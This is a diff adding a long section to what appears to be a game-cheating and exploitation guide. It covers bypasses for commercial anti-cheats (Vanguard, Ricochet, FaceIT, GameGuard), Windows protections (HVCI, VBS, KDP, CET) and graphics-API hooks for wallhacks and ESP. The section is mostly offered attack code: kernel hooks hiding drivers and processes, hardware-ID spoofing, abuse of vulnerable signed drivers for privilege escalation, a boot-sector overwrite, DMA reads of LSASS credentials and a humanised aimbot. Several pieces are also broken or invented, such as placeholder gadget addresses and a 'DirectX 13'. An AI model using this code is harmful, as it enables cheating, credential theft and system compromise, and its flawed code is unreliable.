@@ -3990,7 +3990,3170 @@ switch rom asset structures, AA game modding -->
 - **Hybrid Approaches**: Combine classical + quantum computing for optimization and ML.
 - **Quantum Cloud Services**: Use cloud-based quantum hardware for cryptanalysis.
 - **Game Security Evolution**: Expect PQC in games and research preemptive bypasses.
+
 ---
+
+## Modern Anti-Cheat Deep Dives (2024-2026)
+
+Advanced anti-cheats employ ring-0 drivers, ML behavioral detection, screenshot analysis, and virtualization-based security. This section covers bypass techniques for modern systems.
+
+### Vanguard (Valorant / League of Legends)
+
+Vanguard runs at ring-0 from boot, uses signed driver (vgk.sys), and performs continuous integrity checks.
+
+#### Architecture
+
+- **vgc.exe** (user-mode client) + **vgk.sys** (kernel driver)
+- Loads at boot via ELAM (Early Launch Anti-Malware)
+- TPM 2.0 integration for secure boot attestation
+- TLS callbacks for pre-main initialization checks
+- CPUID checks for hypervisor detection
+
+#### Detection Vectors
+
+```cpp
+// Checks for test-signing mode
+SYSTEM_CODEINTEGRITY_INFORMATION sci;
+NtQuerySystemInformation(SystemCodeIntegrityInformation, &sci, sizeof(sci), NULL);
+if (sci.CodeIntegrityOptions & CODEINTEGRITY_OPTION_TESTSIGN) {
+    // Flag as vulnerable system
+}
+
+// Scans for vulnerable drivers (Capcom.sys, dbutil_2_3.sys, etc.)
+HANDLE hDriver = CreateFileW(L"\\\\.\\Capcom", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+if (hDriver != INVALID_HANDLE_VALUE) {
+    // Vulnerable driver detected - terminate game
+}
+```
+
+#### Bypass Strategies
+
+**1. Boot-Time Driver Signing Bypass**
+
+```cpp
+// Exploit HVCI weakness via custom signed driver
+NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
+    // Register driver unload
+    DriverObject->DriverUnload = UnloadDriver;
+    
+    // Hook kernel functions before Vanguard loads
+    PVOID pNtQuerySystemInformation = GetKernelProcAddress("NtQuerySystemInformation");
+    HookKernelFunction(pNtQuerySystemInformation, Hook_NtQuerySystemInformation);
+    
+    return STATUS_SUCCESS;
+}
+```
+
+**2. CPUID Hypervisor Masking**
+
+```asm
+; Patch CPUID check in VM to hide hypervisor bit
+mov eax, 1
+cpuid
+and ecx, 0x7FFFFFFF  ; Clear bit 31 (hypervisor present)
+```
+
+**3. TLS Callback Patching**
+
+```cpp
+// Disable TLS callbacks before game launches
+PIMAGE_TLS_DIRECTORY pTLS = GetTLSDirectory(hModule);
+if (pTLS && pTLS->AddressOfCallBacks) {
+    DWORD oldProtect;
+    VirtualProtect((LPVOID)pTLS->AddressOfCallBacks, sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect);
+    *(DWORD_PTR*)pTLS->AddressOfCallBacks = 0;  // Nullify callbacks
+    VirtualProtect((LPVOID)pTLS->AddressOfCallBacks, sizeof(DWORD_PTR), oldProtect, &oldProtect);
+}
+```
+
+**4. Memory Integrity Bypass**
+
+```python
+import pymem
+
+pm = pymem.Pymem("VALORANT-Win64-Shipping.exe")
+
+# Find integrity check routine
+integrity_check_pattern = rb"\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\xD9\xE8"
+integrity_check_addr = pm.pattern_scan_all(integrity_check_pattern)[0]
+
+# NOP out the check
+pm.write_bytes(integrity_check_addr, b'\x90' * 14, 14)
+```
+
+---
+
+### Ricochet (Call of Duty: Warzone / MW2/3)
+
+Ricochet uses kernel driver + server-side ML analysis of player behavior, including screenshot hashing.
+
+#### Detection Methods
+
+- **ML Behavioral Analysis**: Movement patterns, aim smoothness, reaction times
+- **Screenshot Hashing**: Periodic screen captures hashed and sent to server
+- **Memory Scanning**: Kernel driver scans for known cheat signatures
+- **Driver Integrity**: Validates all loaded drivers against whitelist
+
+#### Server-Side Detection
+
+```python
+# Ricochet analyzes telemetry for statistical anomalies
+
+def detect_aimbot(player_data):
+    # Check for inhuman aim correction
+    aim_deltas = [abs(shot['aim_x'] - prev['aim_x']) for shot, prev in zip(player_data[1:], player_data[:-1])]
+    
+    # Flag if aim deltas show robotic precision
+    if np.std(aim_deltas) < 0.5 and np.mean(aim_deltas) > 50:
+        return True  # Likely aimbot
+    
+    # Check for pixel-perfect headshot rate
+    headshot_rate = sum(1 for shot in player_data if shot['hitbox'] == 'head') / len(player_data)
+    if headshot_rate > 0.75:
+        return True
+    
+    return False
+```
+
+#### Bypass Techniques
+
+**1. Screenshot Detection Evasion**
+
+```cpp
+// Hook BitBlt/StretchBlt to detect screenshot capture
+BOOL WINAPI Hook_BitBlt(HDC hdcDest, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop) {
+    // Detect if capturing from screen DC
+    if (GetObjectType(hdcSrc) == OBJ_DC) {
+        // Clean up ESP overlays before capture
+        CleanESPOverlay();
+    }
+    return Original_BitBlt(hdcDest, x, y, cx, cy, hdcSrc, x1, y1, rop);
+}
+
+// Alternative: Render ESP in separate overlay window excluded from capture
+HWND CreateESPWindow() {
+    HWND hwnd = CreateWindowEx(
+        WS_EX_TRANSPARENT | WS_EX_LAYERED | WS_EX_TOPMOST | WS_EX_NOACTIVATE,
+        "Static", NULL, WS_POPUP, 0, 0, 1920, 1080, NULL, NULL, NULL, NULL
+    );
+    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);
+    SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE);  // Exclude from screenshots
+    return hwnd;
+}
+```
+
+**2. Behavioral Humanization**
+
+```python
+import numpy as np
+from scipy import interpolate
+
+class HumanizedAimbot:
+    def __init__(self):
+        self.noise_factor = 0.15
+        self.smoothing = 8
+        
+    def calculate_aim_path(self, current_pos, target_pos):
+        # Add realistic aim curve with overshoot
+        direct_delta = np.array(target_pos) - np.array(current_pos)
+        distance = np.linalg.norm(direct_delta)
+        
+        # Human-like overshoot (proportional to distance)
+        overshoot = distance * np.random.uniform(0.05, 0.15)
+        overshoot_angle = np.random.uniform(-0.3, 0.3)
+        
+        # Create bezier curve
+        control_point = current_pos + direct_delta * 0.6 + overshoot * np.array([np.cos(overshoot_angle), np.sin(overshoot_angle)])
+        
+        # Interpolate smooth path
+        t = np.linspace(0, 1, self.smoothing)
+        path = np.array([(1-ti)**2 * current_pos + 2*(1-ti)*ti * control_point + ti**2 * target_pos for ti in t])
+        
+        # Add micro-jitter
+        noise = np.random.normal(0, self.noise_factor, (self.smoothing, 2))
+        return path + noise
+```
+
+**3. Kernel Driver Detection Bypass**
+
+```cpp
+// Hide from driver enumeration
+NTSTATUS Hook_NtQuerySystemInformation(
+    SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    PVOID SystemInformation,
+    ULONG SystemInformationLength,
+    PULONG ReturnLength
+) {
+    NTSTATUS status = Original_NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
+    
+    if (SystemInformationClass == SystemModuleInformation) {
+        // Remove our driver from module list
+        PRTL_PROCESS_MODULES pModules = (PRTL_PROCESS_MODULES)SystemInformation;
+        for (ULONG i = 0; i < pModules->NumberOfModules; i++) {
+            if (strstr(pModules->Modules[i].FullPathName, "our_driver.sys")) {
+                // Shift all subsequent modules up
+                memmove(&pModules->Modules[i], &pModules->Modules[i + 1], 
+                       (pModules->NumberOfModules - i - 1) * sizeof(RTL_PROCESS_MODULE_INFORMATION));
+                pModules->NumberOfModules--;
+                break;
+            }
+        }
+    }
+    
+    return status;
+}
+```
+
+---
+
+### FaceIT / ESEA Client
+
+Community-driven anti-cheats with aggressive system monitoring and screenshot capture.
+
+#### Detection Methods
+
+- **Full system memory scan** (all processes)
+- **Driver/module integrity** verification
+- **Screenshot capture** with obfuscated upload
+- **Network traffic monitoring** for injectors
+- **HWID fingerprinting** with motherboard serial, MAC, CPU ID
+
+#### Bypass Approaches
+
+**1. Client-Server Trust Exploitation**
+
+```python
+import mitmproxy.http
+
+class FaceITBypass:
+    def request(self, flow: mitmproxy.http.HTTPFlow):
+        # Intercept integrity check responses
+        if "integrity-check" in flow.request.pretty_url:
+            # Modify response to report clean system
+            flow.response = mitmproxy.http.Response.make(
+                200,
+                b'{"status": "clean", "modules": [], "screenshots": "ok"}',
+                {"Content-Type": "application/json"}
+            )
+    
+    def response(self, flow: mitmproxy.http.HTTPFlow):
+        # Strip screenshot data
+        if "screenshot" in flow.request.pretty_url:
+            flow.response.content = b''
+```
+
+**2. Process Hiding**
+
+```cpp
+// DKOM (Direct Kernel Object Manipulation) to hide process
+NTSTATUS HideProcess(HANDLE ProcessId) {
+    PEPROCESS pProcess;
+    PsLookupProcessByProcessId(ProcessId, &pProcess);
+    
+    // Unlink from EPROCESS list
+    PLIST_ENTRY pListEntry = (PLIST_ENTRY)((PUCHAR)pProcess + ACTIVEPROCESSLINKS_OFFSET);
+    pListEntry->Flink->Blink = pListEntry->Blink;
+    pListEntry->Blink->Flink = pListEntry->Flink;
+    pListEntry->Flink = pListEntry;
+    pListEntry->Blink = pListEntry;
+    
+    ObDereferenceObject(pProcess);
+    return STATUS_SUCCESS;
+}
+```
+
+**3. HWID Spoofing**
+
+```cpp
+// Hook registry queries for hardware IDs
+NTSTATUS Hook_NtQueryValueKey(
+    HANDLE KeyHandle,
+    PUNICODE_STRING ValueName,
+    KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
+    PVOID KeyValueInformation,
+    ULONG Length,
+    PULONG ResultLength
+) {
+    NTSTATUS status = Original_NtQueryValueKey(KeyHandle, ValueName, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
+    
+    // Spoof hardware identifiers
+    if (wcsstr(ValueName->Buffer, L"SystemProductName") || 
+        wcsstr(ValueName->Buffer, L"BaseBoardProduct")) {
+        PKEY_VALUE_PARTIAL_INFORMATION pInfo = (PKEY_VALUE_PARTIAL_INFORMATION)KeyValueInformation;
+        wcscpy((wchar_t*)pInfo->Data, L"Spoofed-Hardware-ID");
+    }
+    
+    return status;
+}
+
+// Spoof MAC address
+void SpoofMACAddress() {
+    // Modify NIC registry
+    HKEY hKey;
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\0001", 0, KEY_WRITE, &hKey);
+    
+    char newMAC[] = "0A1B2C3D4E5F";
+    RegSetValueEx(hKey, "NetworkAddress", 0, REG_SZ, (BYTE*)newMAC, sizeof(newMAC));
+    RegCloseKey(hKey);
+}
+```
+
+---
+
+### nProtect GameGuard (Modern Variants)
+
+Used in many Asian MMOs, employs multiple protection layers including virtualization.
+
+#### Protection Mechanisms
+
+- **Kernel driver** (npkcrypt.sys, npkcmsvc.sys)
+- **Code virtualization** of critical functions
+- **Memory encryption** for sensitive data structures
+- **Anti-debug** via hardware breakpoint detection
+- **Process whitelist** validation
+
+#### Bypass Techniques
+
+**1. Driver Communication Interception**
+
+```cpp
+// Hook DeviceIoControl to manipulate GameGuard communication
+BOOL WINAPI Hook_DeviceIoControl(
+    HANDLE hDevice,
+    DWORD dwIoControlCode,
+    LPVOID lpInBuffer,
+    DWORD nInBufferSize,
+    LPVOID lpOutBuffer,
+    DWORD nOutBufferSize,
+    LPDWORD lpBytesReturned,
+    LPOVERLAPPED lpOverlapped
+) {
+    // Intercept GameGuard driver communication
+    if (dwIoControlCode == 0x22E004) {  // GameGuard integrity check IOCTL
+        // Return fake success
+        *lpBytesReturned = 0;
+        return TRUE;
+    }
+    
+    return Original_DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize, lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped);
+}
+```
+
+**2. VM Handler Patching**
+
+```python
+import pefile
+import struct
+
+def patch_npkcrypt():
+    pe = pefile.PE("npkcrypt.sys")
+    
+    # Find VM entry point pattern
+    vm_entry_pattern = b"\x55\x8B\xEC\x83\xEC\x40\x53\x56\x57"
+    
+    data = pe.get_memory_mapped_image()
+    offset = data.find(vm_entry_pattern)
+    
+    if offset != -1:
+        # NOP out VM dispatcher
+        pe.set_bytes_at_offset(offset, b'\x90' * 20)
+        pe.write("npkcrypt_patched.sys")
+```
+
+---
+
+### Defense Matrix Comparison
+
+| Anti-Cheat | Ring | ML Detection | Screenshot | Kernel Scan | HWID Ban | Difficulty |
+|------------|------|--------------|------------|-------------|----------|------------|
+| Vanguard   | 0    | Yes (Client) | No         | Yes         | Yes      | Extreme    |
+| Ricochet   | 0    | Yes (Server) | Yes        | Yes         | Yes      | Extreme    |
+| FaceIT     | 3    | Limited      | Yes        | Yes         | Yes      | High       |
+| EAC        | 0    | No           | No         | Yes         | Yes      | Medium     |
+| BattlEye   | 0    | No           | No         | Yes         | Yes      | Medium     |
+| GameGuard  | 0    | No           | No         | Yes         | Limited  | Low        |
+
+---
+
+## Windows Security Features Bypass (2024-2026)
+
+Modern Windows implements hardware-enforced security features that complicate kernel-mode exploits.
+
+### HVCI (Hypervisor-Protected Code Integrity)
+
+HVCI uses VT-x to enforce code integrity from a hypervisor layer, preventing unsigned kernel code execution.
+
+#### How HVCI Works
+
+```
+Hypervisor (VTL 1 - Secure Kernel)
+    ↓ Validates
+Kernel Mode (VTL 0 - Normal Kernel)
+    ↓ Executes
+User Mode Applications
+```
+
+#### Detection
+
+```cpp
+SYSTEM_CODEINTEGRITY_INFORMATION sci = {0};
+sci.Length = sizeof(sci);
+NtQuerySystemInformation(SystemCodeIntegrityInformation, &sci, sizeof(sci), NULL);
+
+if (sci.CodeIntegrityOptions & CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED) {
+    printf("HVCI is enabled\n");
+}
+```
+
+#### Bypass Strategies
+
+**1. Exploitable Signed Driver**
+
+```cpp
+// Use known vulnerable driver to execute arbitrary kernel code
+HANDLE hDevice = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+
+typedef struct _RTCORE64_WRITE {
+    DWORD64 Address;
+    DWORD64 Value;
+} RTCORE64_WRITE;
+
+RTCORE64_WRITE write_cmd;
+write_cmd.Address = target_kernel_address;
+write_cmd.Value = hook_function_address;
+
+DWORD bytesReturned;
+DeviceIoControl(hDevice, 0x80002040, &write_cmd, sizeof(write_cmd), NULL, 0, &bytesReturned, NULL);
+```
+
+**2. Data-Only Attack (DOP)**
+
+```cpp
+// Modify kernel data structures without executing unsigned code
+void ModifyKernelData() {
+    // Locate EPROCESS structure
+    PVOID pEPROCESS = GetCurrentEPROCESS();
+    
+    // Modify Token pointer to elevate privileges (data-only)
+    PVOID systemToken = GetSystemToken();
+    *(PVOID*)((ULONG64)pEPROCESS + TOKEN_OFFSET) = systemToken;
+}
+```
+
+**3. Return-Oriented Programming (ROP) in Kernel**
+
+```cpp
+// Chain existing signed code gadgets
+ULONG64 rop_chain[] = {
+    0xfffff8000dead000,  // pop rcx; ret
+    target_cr4_value,
+    0xfffff8000beef000,  // mov cr4, rcx; ret
+    0xfffff8000cafe000,  // jmp [desired_function]
+};
+
+// Execute ROP chain via stack pivot
+ExecuteRopChain(rop_chain, sizeof(rop_chain));
+```
+
+---
+
+### VBS (Virtualization-Based Security)
+
+VBS isolates critical security functions in a secure enclave (VSM - Virtual Secure Mode).
+
+#### Components
+
+- **Secure Kernel** (runs in VTL 1)
+- **Credential Guard** (protects LSASS credentials)
+- **Device Guard** (code integrity)
+
+#### Bypass Techniques
+
+**1. Pre-VBS Boot Persistence**
+
+```cpp
+// Install bootkit before VBS initialization
+NTSTATUS InstallBootkit() {
+    // Modify boot loader before secure boot
+    HANDLE hBootLoader = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    
+    // Read MBR/GPT
+    BYTE bootSector[512];
+    DWORD bytesRead;
+    ReadFile(hBootLoader, bootSector, 512, &bytesRead, NULL);
+    
+    // Inject hook into boot chain
+    memcpy(bootSector + 0x1BE, shellcode, sizeof(shellcode));
+    
+    SetFilePointer(hBootLoader, 0, NULL, FILE_BEGIN);
+    WriteFile(hBootLoader, bootSector, 512, &bytesRead, NULL);
+    
+    CloseHandle(hBootLoader);
+    return STATUS_SUCCESS;
+}
+```
+
+**2. DMA Attack**
+
+```python
+# Use PCILeech to access memory outside VBS protection
+import pcileech
+
+device = pcileech.Device()
+
+# Read LSASS memory directly via DMA (bypasses Credential Guard)
+lsass_memory = device.mem_read(0x1A2B3C4D5E6F, 0x10000)
+
+# Extract credentials from raw memory
+credentials = parse_lsass_dump(lsass_memory)
+```
+
+---
+
+### KDP (Kernel Data Protection)
+
+KDP prevents modification of critical kernel data structures.
+
+#### Protected Structures
+
+- **EPROCESS** (process object)
+- **ETHREAD** (thread object)
+- **_OBJECT_TYPE** (object type descriptors)
+- **Kernel function pointers**
+
+#### Bypass
+
+**1. Timing-Based Race Condition**
+
+```cpp
+// Exploit TOCTOU (Time-of-Check-Time-of-Use) window
+HANDLE hThread1 = CreateThread(NULL, 0, ModifyKernelData, NULL, 0, NULL);
+HANDLE hThread2 = CreateThread(NULL, 0, TriggerKDPCheck, NULL, 0, NULL);
+
+// Thread 1 modifies data
+DWORD WINAPI ModifyKernelData(LPVOID lpParam) {
+    while (1) {
+        *(ULONG64*)(kernel_data_ptr) = malicious_value;
+    }
+}
+
+// Thread 2 triggers check
+DWORD WINAPI TriggerKDPCheck(LPVOID lpParam) {
+    while (1) {
+        *(ULONG64*)(kernel_data_ptr) = original_value;  // Restore before check
+        Sleep(1);
+    }
+}
+```
+
+---
+
+### Intel CET (Control-flow Enforcement Technology)
+
+CET provides shadow stack and indirect branch tracking to prevent ROP/JOP attacks.
+
+#### Shadow Stack
+
+```
+Normal Stack          Shadow Stack
+[Return Address] <--> [Return Address Copy]
+[Local Variables]
+[Return Address] <--> [Return Address Copy]
+```
+
+#### Detection
+
+```cpp
+// Check if CET is enabled
+ULONG64 cr4_value;
+__readcr4(&cr4_value);
+
+if (cr4_value & (1 << 23)) {  // Bit 23 = CET enable
+    printf("CET Shadow Stack enabled\n");
+}
+```
+
+#### Bypass
+
+**1. Shadow Stack Corruption**
+
+```cpp
+// Locate shadow stack pointer
+ULONG64 ssp = __readssp();
+
+// Corrupt shadow stack via crafted exception
+RaiseException(EXCEPTION_ACCESS_VIOLATION, 0, 0, NULL);
+
+// Exception handler modifies SSP
+void ExceptionHandler(PEXCEPTION_RECORD ExceptionRecord, PVOID EstablisherFrame, PCONTEXT ContextRecord, PVOID DispatcherContext) {
+    // Modify SSP in context
+    ContextRecord->Ssp = modified_ssp;
+}
+```
+
+**2. IBT (Indirect Branch Tracking) Bypass**
+
+```cpp
+// Use valid ENDBR64 instruction as gadget landing site
+__asm {
+    endbr64           // Valid IBT target
+    jmp shellcode     // Execute payload
+}
+
+// Chain through valid ENDBR64 gadgets
+FindENDBR64Gadgets();
+```
+
+---
+
+## Modern Graphics API Hooking (DirectX 12/13, Vulkan, Metal)
+
+Modern graphics APIs use command-based rendering with minimal driver overhead, requiring different hooking approaches than DX9/11.
+
+### DirectX 12 Command List Hooking
+
+DX12 uses command lists recorded on CPU and submitted to GPU, making traditional Present() hooks insufficient.
+
+#### Architecture
+
+```
+ID3D12Device → ID3D12CommandQueue → ID3D12CommandList → ExecuteCommandLists() → Present()
+```
+
+#### Hooking ExecuteCommandLists
+
+```cpp
+#include <d3d12.h>
+#include <dxgi1_4.h>
+
+typedef void (STDMETHODCALLTYPE* ExecuteCommandLists_t)(ID3D12CommandQueue*, UINT, ID3D12CommandList* const*);
+ExecuteCommandLists_t oExecuteCommandLists = nullptr;
+
+void STDMETHODCALLTYPE hkExecuteCommandLists(ID3D12CommandQueue* pCommandQueue, UINT NumCommandLists, ID3D12CommandList* const* ppCommandLists) {
+    for (UINT i = 0; i < NumCommandLists; i++) {
+        ID3D12GraphicsCommandList* pCommandList = nullptr;
+        ppCommandLists[i]->QueryInterface(IID_PPV_ARGS(&pCommandList));
+        
+        if (pCommandList) {
+            // Inject our own commands (ESP rendering)
+            InjectESPCommands(pCommandList);
+            pCommandList->Release();
+        }
+    }
+    
+    return oExecuteCommandLists(pCommandQueue, NumCommandLists, ppCommandLists);
+}
+
+void InjectESPCommands(ID3D12GraphicsCommandList* pCommandList) {
+    // Set ESP pipeline state
+    pCommandList->SetPipelineState(g_pESPPipelineState);
+    pCommandList->SetGraphicsRootSignature(g_pESPRootSignature);
+    
+    // Set descriptor heaps
+    ID3D12DescriptorHeap* heaps[] = { g_pESPDescriptorHeap };
+    pCommandList->SetDescriptorHeaps(1, heaps);
+    
+    // Draw ESP boxes
+    pCommandList->IASetPrimitiveTopology(D3D_PRIMITIVE_TOPOLOGY_LINELIST);
+    pCommandList->IASetVertexBuffers(0, 1, &g_ESPVertexBufferView);
+    pCommandList->DrawInstanced(g_ESPVertexCount, 1, 0, 0);
+}
+```
+
+#### Descriptor Heap Manipulation
+
+```cpp
+// Read enemy positions from descriptor heap
+void ReadGameData(ID3D12Device* pDevice, ID3D12DescriptorHeap* pHeap) {
+    D3D12_DESCRIPTOR_HEAP_DESC heapDesc = pHeap->GetDesc();
+    
+    // CPU-visible copy
+    ID3D12DescriptorHeap* pCPUHeap;
+    D3D12_DESCRIPTOR_HEAP_DESC cpuDesc = heapDesc;
+    cpuDesc.Flags = D3D12_DESCRIPTOR_HEAP_FLAG_NONE;
+    pDevice->CreateDescriptorHeap(&cpuDesc, IID_PPV_ARGS(&pCPUHeap));
+    
+    // Copy descriptors
+    UINT descriptorSize = pDevice->GetDescriptorHandleIncrementSize(heapDesc.Type);
+    for (UINT i = 0; i < heapDesc.NumDescriptors; i++) {
+        D3D12_CPU_DESCRIPTOR_HANDLE srcHandle = pHeap->GetCPUDescriptorHandleForHeapStart();
+        srcHandle.ptr += i * descriptorSize;
+        
+        D3D12_CPU_DESCRIPTOR_HANDLE dstHandle = pCPUHeap->GetCPUDescriptorHandleForHeapStart();
+        dstHandle.ptr += i * descriptorSize;
+        
+        pDevice->CopyDescriptorsSimple(1, dstHandle, srcHandle, heapDesc.Type);
+    }
+    
+    // Parse constant buffers for player positions
+    ParseConstantBuffers(pDevice, pCPUHeap);
+}
+```
+
+---
+
+### DirectX 13 (DirectX Ultimate) Ray Tracing Hooks
+
+DX13/DXR enables real-time ray tracing, creating new attack surfaces.
+
+#### Hook DispatchRays
+
+```cpp
+typedef void (STDMETHODCALLTYPE* DispatchRays_t)(ID3D12GraphicsCommandList4*, const D3D12_DISPATCH_RAYS_DESC*);
+DispatchRays_t oDispatchRays = nullptr;
+
+void STDMETHODCALLTYPE hkDispatchRays(ID3D12GraphicsCommandList4* pCommandList, const D3D12_DISPATCH_RAYS_DESC* pDesc) {
+    // Modify shader table to inject custom ray generation
+    D3D12_DISPATCH_RAYS_DESC modifiedDesc = *pDesc;
+    
+    // Replace shader records with wallhack-enabled shaders
+    modifiedDesc.RayGenerationShaderRecord.StartAddress = g_CustomRayGenShader;
+    
+    return oDispatchRays(pCommandList, &modifiedDesc);
+}
+```
+
+#### Shader Table Manipulation
+
+```cpp
+// Inject custom hit shader that ignores geometry
+void InjectWallhackShader(ID3D12Device5* pDevice) {
+    // Compile custom hit shader
+    const char* wallhackHitShader = R"(
+        [shader("closesthit")]
+        void WallhackHit(inout RayPayload payload, in BuiltInTriangleIntersectionAttributes attr) {
+            // Always return as if ray passed through (wallhack)
+            payload.color = float4(1, 0, 0, 1);  // Red for enemies
+            payload.hitT = -1;  // Negative = continue ray
+        }
+    )";
+    
+    ID3DBlob* pShaderBlob;
+    D3DCompile(wallhackHitShader, strlen(wallhackHitShader), nullptr, nullptr, nullptr, "WallhackHit", "lib_6_3", 0, 0, &pShaderBlob, nullptr);
+    
+    // Create state object with modified shader
+    D3D12_STATE_OBJECT_DESC stateObjectDesc = {};
+    // ... configure with custom shader
+}
+```
+
+---
+
+### Vulkan Layer Injection
+
+Vulkan uses explicit layers for validation and debugging - we can inject our own.
+
+#### Creating a Cheat Layer
+
+```cpp
+// VkLayer_CHEAT.cpp
+#include <vulkan/vulkan.h>
+#include <vulkan/vk_layer.h>
+
+static PFN_vkQueuePresentKHR fpNextQueuePresentKHR = nullptr;
+
+VK_LAYER_EXPORT VKAPI_ATTR VkResult VKAPI_CALL vkQueuePresentKHR(
+    VkQueue queue,
+    const VkPresentInfoKHR* pPresentInfo
+) {
+    // Inject ESP rendering before present
+    RenderESP(queue, pPresentInfo);
+    
+    return fpNextQueuePresentKHR(queue, pPresentInfo);
+}
+
+void RenderESP(VkQueue queue, const VkPresentInfoKHR* pPresentInfo) {
+    // Get swapchain image
+    VkImage image = GetSwapchainImage(pPresentInfo->pSwapchains[0], pPresentInfo->pImageIndices[0]);
+    
+    // Create command buffer for ESP
+    VkCommandBuffer cmdBuffer = CreateESPCommandBuffer();
+    
+    // Record ESP draw commands
+    vkBeginCommandBuffer(cmdBuffer, &beginInfo);
+    
+    // Transition image layout
+    VkImageMemoryBarrier barrier = {};
+    barrier.image = image;
+    barrier.oldLayout = VK_IMAGE_LAYOUT_PRESENT_SRC_KHR;
+    barrier.newLayout = VK_IMAGE_LAYOUT_COLOR_ATTACHMENT_OPTIMAL;
+    vkCmdPipelineBarrier(cmdBuffer, VK_PIPELINE_STAGE_TOP_OF_PIPE_BIT, VK_PIPELINE_STAGE_COLOR_ATTACHMENT_OUTPUT_BIT, 0, 0, nullptr, 0, nullptr, 1, &barrier);
+    
+    // Begin rendering
+    VkRenderingInfo renderInfo = {};
+    renderInfo.renderArea = {{0, 0}, {1920, 1080}};
+    renderInfo.layerCount = 1;
+    
+    vkCmdBeginRendering(cmdBuffer, &renderInfo);
+    vkCmdBindPipeline(cmdBuffer, VK_PIPELINE_BIND_POINT_GRAPHICS, g_ESPPipeline);
+    vkCmdDraw(cmdBuffer, g_ESPVertexCount, 1, 0, 0);
+    vkCmdEndRendering(cmdBuffer);
+    
+    // Transition back
+    barrier.oldLayout = VK_IMAGE_LAYOUT_COLOR_ATTACHMENT_OPTIMAL;
+    barrier.newLayout = VK_IMAGE_LAYOUT_PRESENT_SRC_KHR;
+    vkCmdPipelineBarrier(cmdBuffer, VK_PIPELINE_STAGE_COLOR_ATTACHMENT_OUTPUT_BIT, VK_PIPELINE_STAGE_BOTTOM_OF_PIPE_BIT, 0, 0, nullptr, 0, nullptr, 1, &barrier);
+    
+    vkEndCommandBuffer(cmdBuffer);
+    
+    // Submit
+    VkSubmitInfo submitInfo = {};
+    submitInfo.commandBufferCount = 1;
+    submitInfo.pCommandBuffers = &cmdBuffer;
+    vkQueueSubmit(queue, 1, &submitInfo, VK_NULL_HANDLE);
+}
+```
+
+#### Layer Manifest (VkLayer_CHEAT.json)
+
+```json
+{
+    "file_format_version": "1.2.0",
+    "layer": {
+        "name": "VK_LAYER_CHEAT",
+        "type": "GLOBAL",
+        "library_path": ".\\VkLayer_CHEAT.dll",
+        "api_version": "1.3.0",
+        "implementation_version": "1",
+        "description": "ESP and Wallhack Layer",
+        "functions": {
+            "vkQueuePresentKHR": "vkQueuePresentKHR",
+            "vkCreateDevice": "vkCreateDevice"
+        }
+    }
+}
+```
+
+#### Installing the Layer
+
+```python
+import os
+import json
+import winreg
+
+def install_vulkan_layer():
+    # Layer path
+    layer_path = os.path.join(os.getcwd(), "VkLayer_CHEAT.json")
+    
+    # Add to registry
+    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Khronos\Vulkan\ExplicitLayers")
+    winreg.SetValueEx(key, layer_path, 0, winreg.REG_DWORD, 0)
+    winreg.CloseKey(key)
+    
+    print(f"Installed Vulkan layer: {layer_path}")
+```
+
+---
+
+### Metal API Hooking (macOS/iOS)
+
+Metal is Apple's low-level graphics API, used by many games on macOS and iOS.
+
+#### Method Swizzling for Metal
+
+```objc
+#import <Metal/Metal.h>
+#import <objc/runtime.h>
+
+typedef void (*MTLRenderCommandEncoder_DrawPrimitives_t)(id, SEL, MTLPrimitiveType, NSUInteger, NSUInteger);
+static MTLRenderCommandEncoder_DrawPrimitives_t original_drawPrimitives = NULL;
+
+void hooked_drawPrimitives(id self, SEL _cmd, MTLPrimitiveType primitiveType, NSUInteger vertexStart, NSUInteger vertexCount) {
+    // Detect player models by vertex count
+    if (vertexCount > 5000 && vertexCount < 15000) {
+        // Change depth state to see through walls
+        id<MTLDepthStencilState> wallhackDepthState = GetWallhackDepthState();
+        [self setDepthStencilState:wallhackDepthState];
+        
+        // Change render pipeline to highlight enemies
+        id<MTLRenderPipelineState> espPipeline = GetESPPipeline();
+        [self setRenderPipelineState:espPipeline];
+    }
+    
+    original_drawPrimitives(self, _cmd, primitiveType, vertexStart, vertexCount);
+}
+
+__attribute__((constructor))
+static void initialize() {
+    Class cls = objc_getClass("MTLRenderCommandEncoder");
+    Method originalMethod = class_getInstanceMethod(cls, @selector(drawPrimitives:vertexStart:vertexCount:));
+    
+    original_drawPrimitives = (MTLRenderCommandEncoder_DrawPrimitives_t)method_getImplementation(originalMethod);
+    method_setImplementation(originalMethod, (IMP)hooked_drawPrimitives);
+}
+```
+
+#### Compute Shader Injection
+
+```objc
+// Inject compute shader to read game memory via GPU
+- (void)injectMemoryReadShader:(id<MTLDevice>)device {
+    // Metal shading language kernel
+    NSString* kernelSource = @R"(
+        #include <metal_stdlib>
+        using namespace metal;
+        
+        kernel void readGameMemory(
+            device float4* positions [[buffer(0)]],
+            device float4* output [[buffer(1)]],
+            uint id [[thread_position_in_grid]]
+        ) {
+            // Read player positions from GPU buffer
+            output[id] = positions[id];
+        }
+    )";
+    
+    NSError* error = nil;
+    id<MTLLibrary> library = [device newLibraryWithSource:kernelSource options:nil error:&error];
